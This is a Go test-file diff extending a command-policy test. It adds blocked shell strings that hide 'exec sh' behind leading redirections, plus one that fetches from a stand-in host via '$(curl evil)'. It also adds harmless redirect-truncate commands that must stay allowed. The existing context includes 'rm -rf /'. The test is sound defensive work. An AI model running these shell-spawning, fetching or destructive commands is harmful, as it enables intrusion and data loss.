@@ -717,6 +717,18 @@ func TestPolicyBlocksExecAfterLeadingRedirectionAndBacktick(t *testing.T) {
 		"echo `exec sh`",
 		"echo `rm -rf /`",
 		"coproc exec sh",
+		// A redirect target may be separated from its operator by whitespace, so
+		// the space-separated spellings are the same commands as the ones above
+		// and must match too.
+		"> out exec sh",
+		"2> /dev/null exec sh",
+		">> log exec sh",
+		"< in exec sh",
+		">&2 exec sh",
+		"ls; > out exec sh",
+		"> a > b exec sh",
+		"1>out 2>err exec sh",
+		"> out $(curl evil)",
 	}
 	for _, cmd := range blocked {
 		t.Run(cmd, func(t *testing.T) {
@@ -727,6 +739,14 @@ func TestPolicyBlocksExecAfterLeadingRedirectionAndBacktick(t *testing.T) {
 	// Redirection in its ordinary place — after the command word — must not turn
 	// an unrelated command into a match, and a backtick must not make one out of
 	// a word that merely contains a signal.
+	//
+	// The cases with a *space* before a filename beginning `exec` are the ones the
+	// first version of the redirection prefix got wrong: it consumed only the
+	// operator, leaving the redirect target in command position, so `ls; > exec.log`
+	// — a truncate idiom that executes nothing (verified: the file ends up empty)
+	// — was refused as a shell-exec bypass. The `>>` cases pin the second half of
+	// the fix, since `{1,2}` will otherwise read one `>` as the operator and the
+	// other as a target.
 	allowed := []string{
 		"ls -la > /tmp/out",
 		"grep ExecStart /lib/systemd/system/nginx.service 2>/dev/null",
@@ -734,6 +754,19 @@ func TestPolicyBlocksExecAfterLeadingRedirectionAndBacktick(t *testing.T) {
 		"cat /var/log/exec-audit.log >> archive.log",
 		"echo `date`",
 		"echo `hostname`",
+		"ls; > exec.log",
+		"ls; 2> exec.log",
+		"ls; >> exec.log",
+		"ls; 2>> exec.err",
+		"echo hi; > exec",
+		"tar -cf a.tar x; > exec.d",
+		"( > exec.log )",
+		"{ > exec.log; }",
+		"cat foo; > execution-trace.txt",
+		"make; > exec_summary.md",
+		"ls; > $(date +%F).log",
+		"ls; >> $(date).log",
+		"ls; > exec-trace-$(hostname).log",
 	}
 	for _, cmd := range allowed {
 		t.Run("allowed/"+cmd, func(t *testing.T) {
